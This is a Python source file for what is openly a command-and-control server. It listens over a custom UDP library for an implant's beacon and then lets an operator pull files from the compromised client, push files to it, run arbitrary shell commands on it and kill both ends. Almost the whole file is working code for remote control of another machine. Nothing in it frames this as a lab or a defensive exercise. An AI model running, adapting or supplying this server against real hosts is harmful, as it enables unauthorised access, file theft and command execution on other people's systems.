import time
import tempfile
import sys
import struct
import random

sys.path.insert(0, "./git-gud-udp")
from ggudp import GGUdp

# These are globals just for ease of editing the file / testing
# Connection time-out value. If this timeout is reached, falls back to initial callback
CALLOUT_TIMEOUT = 120

# C2 info
C2_ADDR = "0.0.0.0"
C2_PORT = 8000

# Use encryption. This argv is used for testing, just set to True or False
USE_ENCRYPTION = (len(sys.argv) > 1)

class Server(object):
    def __init__(self, ip="0.0.0.0", port=8000):
        print("[+] Setting up server: {}:{}".format(ip, port))
        print("[+] Server is{}encrypted".format(" " if USE_ENCRYPTION else " NOT "))
        self.s = GGUdp(ip, port)
        self.s.bind()
        self.initial_catch()
        self.loop()
    
    def initial_catch(self):
        while True:
            beacon = self.s.recv(False, USE_ENCRYPTION)
            if beacon:
                try:
                    print("[+] Incoming connection from...")
                    print("[+] [addrss] {}".format(self.s._addr))
                    print("[+] [beacon] {}".format(repr(beacon)))
                    response = struct.pack("I", random.randint(0,0xffffffff))
                    self.s.send(response, USE_ENCRYPTION)
                    print("[+] Sent response")
                    break
                except KeyboardInterrupt:
                    print("Ctrl+C! Quitting...")
                    sys.exit()
                except Exception as e:
                    print(str(e))
                except:
                    pass
    
    def display_response(self, data, download):
        if download and data != "fail":
            tmpfile = tempfile.mktemp()
            with open(tmpfile, "wb") as f:
                f.write(data)
                print("File downloaded to: {}".format(tmpfile))
        else:
            print(data)
    
    def loop(self):
        global CALLOUT_TIMEOUT
        catchloop = False
        while True:
            # Get command
            download = False
            timeout = time.time()
            command = raw_input("{}> ".format(self.s._addr))
            if time.time()-timeout >= CALLOUT_TIMEOUT or catchloop:
                self.initial_catch()
                catchloop = False
            if command.startswith("u"):
                try:
                    upload,data = command.split("|", 1)
                    if data.startswith("file:"):
                        filename = str(data[5:])
                        with open(filename, "rb") as f:
                            data = f.read()
                        command = upload+"|"+data
                    command = command.replace("|","\x00",1)
                except:
                    print("Syntax wrong or file does not exist or something")
                    continue
            elif command.startswith("d"):
                download = True
            elif command.startswith("QUIT!"):
                command = "q"
                CALLOUT_TIMEOUT = 1
            elif command.startswith("!"):
                pass
            else:
                print("""Command Usage:
    d<filename>             # Downloads a file to a temp file
    u<filename>|<data>      # Uploads <data> to <filename> on client
    u<filename>|file:<path> # Uploads the file <path> to <filename> on client
    !<command>              # Executes command on client
    QUIT!                   # Kills both client and server""")
                continue
            # Send command
            status = self.s.send(command, USE_ENCRYPTION)
            if not status:
                print("Sending command failed")
                catchloop = True
                continue
            
            # Receive response
            data = self.s.recv(CALLOUT_TIMEOUT, USE_ENCRYPTION)
            if not data:
                print("Receiving response failed")
                break
            
            # Display response
            self.display_response(data, download)

if __name__ == "__main__":
    s = Server(C2_ADDR, C2_PORT)
